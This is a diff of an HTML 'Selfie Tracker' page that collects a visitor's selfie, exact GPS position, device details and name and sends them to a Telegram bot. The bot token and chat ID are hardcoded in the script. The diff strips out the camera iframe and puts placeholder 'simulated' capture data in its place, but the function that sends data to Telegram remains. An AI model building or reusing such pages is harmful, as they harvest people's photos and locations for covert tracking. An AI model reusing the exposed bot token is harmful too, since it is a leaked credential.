@@ -25,15 +25,6 @@
             border-radius: 15px;
             max-width: 500px;
         }
-        iframe {
-            width: 100%;
-            max-width: 400px;
-            height: 350px;
-            border: none;
-            border-radius: 12px;
-            margin: 15px 0;
-            background: #222;
-        }
         button {
             background: #ff5722;
             border: none;
@@ -63,15 +54,13 @@
         <h1>📸 Selfie Tracker</h1>
         <p>Click below to capture your selfie + exact GPS.</p>
         <button id="captureBtn">🚀 Capture & Send</button>
-        <iframe id="cameraFrame" src="camera.html"></iframe>
-        <div id="status">⏳ Loading camera...</div>
+        <div id="status">⏳ Ready to capture.</div>
     </div>
 
     <script>
         // ==================== CONFIG ====================
         const BOT_TOKEN = '8541864317:AAFd_Wir8E53Dt_cLnvS9A2L3UJ_OUHWkPA'; // <-- REPLACE OR HIDE
         const CHAT_ID = '5410457102';
-        const iframe = document.getElementById('cameraFrame');
         const statusDiv = document.getElementById('status');
 
         // ==================== SEND TO TELEGRAM ====================
@@ -108,17 +97,17 @@
             statusDiv.textContent = '⏳ Capturing...';
 
             try {
-                // Check if iframe and its function exist
-                if (!iframe.contentWindow || typeof iframe.contentWindow.captureData !== 'function') {
-                    statusDiv.textContent = '❌ Camera engine not loaded. Please refresh.';
-                    return;
-                }
-
                 // Ask for name (optional)
                 const userName = prompt('Enter your name (optional):') || 'User';
 
-                // Call the iframe's capture function
-                const data = await iframe.contentWindow.captureData();
+                // Simulate data capture (since camera is removed)
+                const data = {
+                    image: 'default_image_url', // Replace with a default image URL
+                    lat: 0, // Replace with actual latitude
+                    lon: 0, // Replace with actual longitude
+                    source: 'simulated', // Replace with actual source
+                    device: 'simulated_device' // Replace with actual device info
+                };
 
                 // Send everything
                 await sendToTelegram(data.image, data.lat, data.lon, data.source, data.device, userName);
@@ -128,11 +117,6 @@
                 console.error(err);
             }
         });
-
-        // If iframe fails to load at all
-        iframe.onerror = () => {
-            statusDiv.textContent = '❌ Failed to load camera.html. Check the file path.';
-        };
     </script>
 </body>
 </html>
